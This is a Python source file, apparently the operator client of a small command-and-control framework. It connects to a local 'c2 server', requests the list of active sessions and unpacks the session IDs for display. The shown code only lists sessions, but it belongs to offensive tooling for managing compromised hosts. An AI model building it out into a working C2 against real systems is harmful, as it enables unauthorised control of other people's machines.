import socket
import struct
import protocol
import console
import colors

command_dispather = ["help", "exit"]
TARGET_PORT = 9000
TARGET_IP = "127.0.0.1"
HOST = "0.0.0.0"



def receive_exact(operator_socket, length): # function to receive the data in chunks 
    data = b""
    while len(data) < length:
        chunk = operator_socket.recv(length - len(data))
        if not chunk:
            raise ConnectionError(f"{colors.Fore.RED} [!] c2 server closed connection")
        data += chunk
    return data



def receive_sessionInfo(operator_socket, sessionCount_size): # deserialize sessionInfo bytes and display total sessions and session ids
    sessionCount_Bytes = receive_exact(operator_socket, 4) # receive total number of sessions present
    sessionCount = struct.unpack("!I", sessionCount_Bytes)[0] # !I is used to unpack network bytes (Big endian) data into Python integer
    # struct.unpack() returns a tuple, so [0] is used to get only one value
    sessionId_List = []
    for _ in range(sessionCount):
        sessionId_Bytes = receive_exact(operator_socket, 4) # receive session_id which is 4 bytes per session_id
        session_id = struct.unpack("!I", sessionId_Bytes)[0]
        sessionId_List.append(session_id)
    #console.display_sessionInfo(sessionId_List, sessionCount)
    return sessionId_List, sessionCount



def connect(command):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as operator_socket:
        try:
            operator_socket.connect((TARGET_IP, TARGET_PORT))
            #print(f"[+] operator connected to server successfully")
            packet_bytes = protocol.sessions_packet_formation(command)
            operator_socket.sendall(packet_bytes)
            while True:
                if command == "sessions":
                    sessionList, sessionCount = receive_sessionInfo(operator_socket, 4) # passing operator socket and 4 bytes cuz number of session ids are 4 bytes
                    console.display_sessionInfo(sessionList, sessionCount)
                    break
        except OSError as e:
            print(f"{colors.Fore.RED}[!] couldn't connect to c2 server\n")
            operator_socket.close()